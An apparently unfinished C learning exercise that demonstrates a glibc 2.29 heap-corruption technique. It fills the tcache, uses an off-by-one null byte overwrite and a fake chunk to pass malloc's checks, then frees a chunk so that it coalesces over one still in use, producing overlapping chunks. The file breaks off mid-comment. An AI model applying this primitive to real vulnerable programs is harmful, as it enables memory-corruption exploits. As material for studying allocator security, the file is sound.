#include <stdlib.h>


typedef struct allocated_chunk_s allocated_chunk;
struct allocated_chunk_s {
    size_t prev_size; // size of prev chunk contiguous with this chunk in mem (if free)
    // if prev_chunk is not free then prev_size is prev_chunk.data
    size_t size; // size of this chunk
    void* data; // data of this chunk
};

typedef struct unallocated_chunk_s unallocated_chunk;
typedef struct unallocated_chunk_s {
    size_t prev_size; // size of prev chunk contiguous with this chunk in mem (must be free)
    size_t size; // size of this chunk
    unallocated_chunk* fd; // pointer to next unallocated chunk (closer to head)
    unallocated_chunk* bk; // pointer to previous unallocated chunk (closer to tail)
    void* data; // data of this chunk (some overwritten by fd and bk)
};

typedef union chunk_u chunk;
union chunk_u {
    allocated_chunk ac;
    unallocated_chunk uc;
};

int main() {

    // tcache stores up to 7 chunks to each binlist in fast/small/large
    // allocate 7 chunks for the same binlist to fill it up
    void* trash1 = malloc(0x110);
    void* trash2 = malloc(0x110);
    void* trash3 = malloc(0x110);
    void* trash4 = malloc(0x110);
    void* trash5 = malloc(0x110);
    void* trash6 = malloc(0x110);
    void* trash7 = malloc(0x110);

    // allocate our exploit chunks here
    // all chunks have an addition 0x10 bytes for allocated_chunk header
    char* a = malloc(0x110);
    char* b = malloc(0x110);
    void* c = malloc(0x110);

    // fill up our tcache so it stays the fuck out of our way
    free(trash1);
    free(trash2);
    free(trash3);
    free(trash4);
    free(trash5);
    free(trash6);
    free(trash7);

    // b is freed, c.prev_inuse bit set to 0 and c.prev_size set to 0x120
    free(b);
    __asm__("int3");

    // overwrite the last byte in b.size to 0, b is now 0x100
    // c.prev_size does not change since &b + (b.size) != &c
    b[-8] = 0;

    // setup a fake chunk to pass glibc-2.29 check during malloc chunk splitting:
    // prev_size of next chunk must match size value of current chunk
    // else: ("malloc(): invalid next size (unsorted)");
    b[0xf0] = 0x00; // prev_size
    b[0xf1] = 0x01; // prev_size
    b[0xf8] = 0x20; // size fake chunk
    __asm__("int3");
    
    // small chunk allocated at starting b position (size 0x90)
    void* b1 = malloc(0x80);
    // chunk b split into 0x90 small chunk and 0x70 chunk in unsorted bin (along with fake chunk)
    void* b2 = malloc(0x60); // 0x70 chunk from unsorted bin used as space here
    
    free(b1); // b1 freed to set fd and bk pointers
    // when c is freed glibc checks c.prev_in_use
    // if true then it checks c->fd->bk == c as sec check
    // then c and prev_chunk (b1) are coalesced
    __asm__("int3");
    free(c);

    // since c thinks b is size 0x120 due to c.prev_size, all memory from b to c is freed
    // b2 was not freed yet and is now still writeable while in a free chunk
    
    __asm__("int3");
    void* padding = malloc(0x90); // the next portion of free memory will be b2
    __asm__("int3");

    // we now have an allocated chunk in 
    // 


    // fast bin allocated after b1
    



}
